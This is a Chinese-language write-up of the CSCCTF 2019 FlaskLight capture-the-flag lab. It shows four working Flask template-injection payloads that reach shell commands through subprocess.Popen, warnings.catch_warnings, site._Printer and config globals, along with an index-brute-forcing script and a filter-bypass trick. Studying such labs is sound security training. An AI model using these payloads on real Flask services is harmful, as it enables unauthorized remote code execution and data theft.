# CSCCTF 2019 Qual]FlaskLight 1

## 0、知识点与技术

>   flask 模板注入

>   Python中`subprocess.Popen`、`class 'site._Printer'`、`warnings.catch_warnings` 模块、`config` 的运用

>   内含四种解题方法

### 关于subprocess.Popen

>   subprocess这个模块是用来产生子进程，然后可以连接到这个子进程传入值并获得返回值

>   subprocess中的Popen类，这个类中可以传入一些参数值
>
>   ```java
>   class subprocess.Popen( 
>    args,						-- 字符串或者列表，表示要执行的命令如：
>       subprocess.Popen(["cat","test.txt"])或subprocess.Popen("cat test.txt", shell=True)
>    bufsize=0,					-- 缓存大小，0无缓冲，1行缓冲
>    executable=None,			-- 程序名，一般不用
>    stdin=None,				-- 子进程标准输入
>    stdout=None,				-- 输出
>    stderr=None,				-- 错误
>    preexec_fn=None,
>    close_fds=False,
>    shell=False,				-- 为ture的时候，unix下相当于args前添加了一个 /bin/sh -c
>      							--				window下相当于添加 cmd.exe /c
>    cwd=None,					-- 设置工作目录
>    env=None,					-- 设置环境变量
>    universal_newlines=False,	-- 各种换行符统一处理成 \n
>    startupinfo=None,			-- window下传递给createprocess的结构体
>    creationflags=0)			-- window下传递create_new_console创建自己的控制台窗口
>   ```
>
>   参考地址：https://www.cnblogs.com/zhoug2020/p/5079407.html
>
>   https://www.cnblogs.com/security-darren/p/4733368.html

### 关于Popen.communicate()

>   ` communicate()：`和子进程交互，发送和读取数据

>   使用 `subprocess` 模块的 `Popen` 调用外部程序，如果 `stdout` 或 `stderr` 参数是 pipe，
>
>   并且程序输出超过操作系统的 pipe size时，如果使用 `Popen.wait()` 方式等待程序结束获取返回值，会[导致死锁](http://docs.python.org/release/2.7.3/library/subprocess.html#subprocess.Popen.wait)，程序卡在 `wait()` 调用上
>
>   `ulimit -a` 看到的 pipe size 是 4KB，那只是每页的大小，查询得知 linux 默认的 [pipe size 是 64KB](http://stackoverflow.com/questions/4624071/pipe-buffer-size-is-4k-or-64k)。

使用 `Popen.communicate()`。这个方法会把输出放在内存，而不是管道里，

所以这时候上限就和内存大小有关了，一般不会有问题。而且如果要获得程序返回值，

可以在调用 `Popen.communicate()` 之后取 `Popen.returncode` 的值。

>   参考地址：https://blog.csdn.net/carolzhang8406/article/details/22286913

## 1、解法一

>   首先查看页面然后查看网页源代码发现提示，需要get方式提交一个参数search，然后题目给的提示是flask
>
>   那么可以想到是flask模板注入的问题

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107094705.png)

>   测试一下发现确实是存在漏洞

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/202301070950624.png)

>   然后列出对象的属性，在找到object的位置
>
>   ```
>   http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__}}
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107095312.png)

```
http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__.__mro__}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107095353.png)

>   找到object的位置然后列出所有属性

```
http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/image-20230107095504396.png)

>   然后找到`<class 'subprocess.Popen'>`的下标位置，这里提供一个脚本

```py
import requests
import re
import html
import time

index = 0
for i in range(1, 1000):
    try:
        # 因为输出的属性很多所有这里一个一个输出下标内容的值，然后与之对比
        url = "http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81//?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        # 提取返回的内容
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.2)
        # 转义字符
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        # 记录下标
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))

```

>   **跑完可以得下标的值为258**,使用如下命令获取根目录文件名称

```
http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107101258.png)

>   可以发现路径前面都多了一个\n，然后可以在末尾添加strip()去除，communicate()的执行结果是一个列表

```shell
http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107101653.png)

>   查看一下flasklight 目录

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107101812.png)

>   查看coomme_geeeett_youur_flek

```shell
http://454fe7fb-8c9b-4941-ad6b-dc265fb5fc9a.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107101913.png)

>   参考文章：
>
>   https://blog.csdn.net/mochu7777777/article/details/107589811

## 2、解法二

>   使用列表，通过列表获取object的所有属性。`__base__获取所继承的基类名`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107110036.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107110119.png)



>   通过上面的那个脚本寻找`warnings.catch_warnings`的位置，**可以发现位置在59位**
>
>   这个`warnings.catch_warnings`是不含os模块的类，所以在使用的时候需要`import os`模块

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107110656.png)

>   找到位置后通过`__init__`进行初始化，然后使用`__globals__`获得全局变量，在使用`__builtins__`内键命名空间，运行一个`eval`对象，参数为`__import__('os').popen('ls').read()`，意思为导入`os`模块然后使用`popen()`方法执行命令，这个方法还有两个可选参数，分别为文件读取权限的模式（默认为 r ）、缓冲大小，最后通过`read()`方法读取内容，**read()方法不传入参数默认读取所有**

>   其中需要注意的是globals这个单词放一起会被过滤掉，需要使用拼接方式绕过

```c
http://9a411cb8-676e-4159-b700-8e87fb573761.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107115632.png)

>   然后查看**flasklight** 文件夹中的内容，

```c
http://9a411cb8-676e-4159-b700-8e87fb573761.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls flasklight').read()")}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107115717.png)

>   最后读取flag

```c
http://9a411cb8-676e-4159-b700-8e87fb573761.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat flasklight/coomme_geeeett_youur_flek').read()")}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107115809.png)

## 3、解法三

>   前面同样的需要获取到所有类的属性，不过这次需要找到`class 'site._Printer'`的下标位置

>   使用上面的脚本可以找到**下标位置为71**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107134242.png)

>   关于`class 'site._Printer'`这个类，这个类是内含os模块的，所以可以直接使用os模块，然后使用popen()方法执行命令，使用read()方法获取其返回值，这里也是同样globals被过滤掉了

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107134714.png)

>   然后查看flasklight 文件夹

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls flasklight ').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107134814.png)

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107134920.png)

## 4、解法四

>   这次使用基于config的测试

>   直接输入config会发现有返回值

```
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{config}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107135337.png)

>   然后可以直接通过config初始化一个全局变量然后在使用os模块、popen()方法执行命令read()读取值

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{config.__init__['__glo'+'bals__'].os.popen('ls').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107135541.png)

>   可以发现直接获取到了根目录文件列表，那么接下来的事情就是获取flag

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{config.__init__['__glo'+'bals__'].os.popen('cat flasklight').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107135643.png)

```c
http://ef367849-b584-41fc-a217-2b5e4baaf5cd.node4.buuoj.cn:81/?search={{config.__init__['__glo'+'bals__'].os.popen('cat flasklight/coomme_geeeett_youur_flek').read()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107135712.png)